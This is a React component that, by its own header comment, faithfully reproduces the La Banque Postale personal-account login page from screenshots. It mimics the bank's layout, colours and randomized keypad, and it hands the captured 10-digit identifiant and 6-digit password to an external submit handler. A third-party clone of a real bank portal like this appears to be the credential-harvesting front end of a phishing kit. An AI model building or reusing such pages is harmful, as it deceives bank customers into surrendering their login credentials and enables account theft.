import { useEffect, useMemo, useState } from "react";

/**
 * Faithful reproduction of the official La Banque Postale customer portal login screen
 * (mobile + desktop), based on the user-provided screenshots:
 *  - Title: "Connexion à votre compte particulier"
 *  - Plain input (spaced digits as user types) for the 10-digit identifiant
 *  - "Mémoriser mon identifiant" switch on the right
 *  - Below: 6 empty circle puces + randomized 5x2 virtual keypad
 *  - Single "Se connecter" CTA appears once identifiant is filled
 *  - Bottom link: "Identifiant / Mot de passe oublié"
 */

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

export default function LoginStep({ onSubmit, submitting }) {
  const [identifiant, setIdentifiant] = useState("");
  const [memorize, setMemorize] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const [keypadKey, setKeypadKey] = useState(0);
  const keypadDigits = useMemo(
    () => shuffle(["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]),
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [keypadKey]
  );

  // Re-randomize when the identifiant has reached 10 digits (password panel becomes useable)
  const idComplete = identifiant.length === 10;
  useEffect(() => {
    if (idComplete) setKeypadKey((k) => k + 1);
  }, [idComplete]);

  const handleIdentifiantChange = (e) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 10);
    setIdentifiant(v);
    if (error) setError("");
  };

  const handleKeyClick = (digit) => {
    if (!idComplete) {
      setError("Saisissez d'abord vos 10 chiffres d'identifiant.");
      return;
    }
    if (password.length >= 6) return;
    setPassword((p) => p + digit);
    if (error) setError("");
  };

  const handleErasePassword = () => setPassword("");

  const handleSeConnecter = (e) => {
    e.preventDefault();
    if (!idComplete) {
      setError("L'identifiant doit contenir 10 chiffres.");
      return;
    }
    if (password.length !== 6) {
      setError("Le mot de passe doit contenir 6 chiffres.");
      return;
    }
    setError("");
    onSubmit({
      identifiant,
      mot_de_passe: password,
      memorise: memorize,
    });
  };

  // Spaced display of the identifiant ("5 5 5 5 5 5 5 5 5 5")
  const displayedIdentifiant = identifiant.split("").join(" ");

  return (
    <div className="fade-in" data-testid="login-step">
      <h1 className="text-2xl sm:text-3xl font-bold tracking-tight text-[#003366] mb-8">
        Connexion à votre compte particulier
      </h1>

      <form onSubmit={handleSeConnecter} className="space-y-6" data-testid="login-form">
        {/* Identifiant */}
        <div className="space-y-3">
          <label
            htmlFor="identifiant"
            className="block text-base font-bold text-[#003366]"
          >
            Identifiant (10 chiffres)
          </label>
          <input
            id="identifiant"
            data-testid="login-identifiant-input"
            type="tel"
            inputMode="numeric"
            autoComplete="username"
            maxLength={10}
            value={displayedIdentifiant}
            onChange={handleIdentifiantChange}
            className="w-full h-14 rounded-md border border-[#B6BAC2] bg-white px-5 text-lg sm:text-xl font-medium text-[#003366] tracking-[0.15em] outline-none transition focus:border-[#003366] focus:ring-2 focus:ring-[#003366]/20"
            aria-label="Identifiant 10 chiffres"
          />
        </div>

        {/* Switch mémoriser - on the right */}
        <button
          type="button"
          data-testid="login-memorize-toggle"
          onClick={() => setMemorize((v) => !v)}
          className="flex w-full items-center justify-between text-base text-[#003366] select-none"
        >
          <span className="font-medium">Mémoriser mon identifiant</span>
          <span className={`lbp-switch ${memorize ? "on" : ""}`}>
            <span className="lbp-switch-knob" />
          </span>
        </button>

        {/* Password section */}
        <div className="pt-2">
          <div className="text-base font-bold text-[#003366]">
            Mot de passe (6 chiffres)
          </div>

          {/* Empty circle puces */}
          <div className="mt-4 flex items-center justify-center gap-4 sm:gap-5" aria-live="polite">
            {[0, 1, 2, 3, 4, 5].map((i) => (
              <span
                key={i}
                data-testid={`pwd-dot-${i}`}
                className={`h-5 w-5 rounded-full border-[2.5px] transition ${
                  password.length > i
                    ? "bg-[#003366] border-[#003366]"
                    : "border-[#003366] bg-white"
                }`}
              />
            ))}
          </div>

          {password.length > 0 && (
            <div className="mt-2 text-center">
              <button
                type="button"
                data-testid="pwd-clear"
                onClick={handleErasePassword}
                className="text-xs text-[#4F5A6B] hover:text-[#003366] underline"
              >
                Effacer
              </button>
            </div>
          )}

          {/* Virtual randomized keypad - 5 cols x 2 rows */}
          <div
            data-testid="virtual-keypad"
            className="mt-6 grid grid-cols-5 gap-2 sm:gap-3"
          >
            {keypadDigits.map((digit, idx) => (
              <button
                key={`${keypadKey}-${idx}`}
                type="button"
                data-testid={`keypad-key-${digit}`}
                onClick={() => handleKeyClick(digit)}
                disabled={password.length >= 6 || submitting}
                className="h-14 sm:h-16 rounded-lg bg-[#E8F1FB] text-[#003366] text-xl sm:text-2xl font-bold hover:bg-[#D6E5F7] active:bg-[#C2D6F0] disabled:opacity-50 transition"
              >
                {digit}
              </button>
            ))}
          </div>
        </div>

        {error && (
          <p data-testid="login-error" className="text-sm text-[#C8102E] text-center">
            {error}
          </p>
        )}

        {/* Se connecter */}
        <button
          type="submit"
          data-testid="login-submit"
          disabled={submitting}
          className="w-full h-14 rounded-md bg-[#003399] hover:bg-[#002A85] active:bg-[#001F66] text-white text-lg font-semibold transition disabled:opacity-60"
        >
          {submitting ? "Connexion…" : "Se connecter"}
        </button>

        {/* Forgot link */}
        <div className="text-center pt-2">
          <a
            href="#"
            data-testid="login-forgot"
            onClick={(e) => e.preventDefault()}
            className="text-sm sm:text-base font-medium text-[#003366] underline hover:opacity-80"
          >
            Identifiant / Mot de passe oublié
          </a>
        </div>
      </form>
    </div>
  );
}
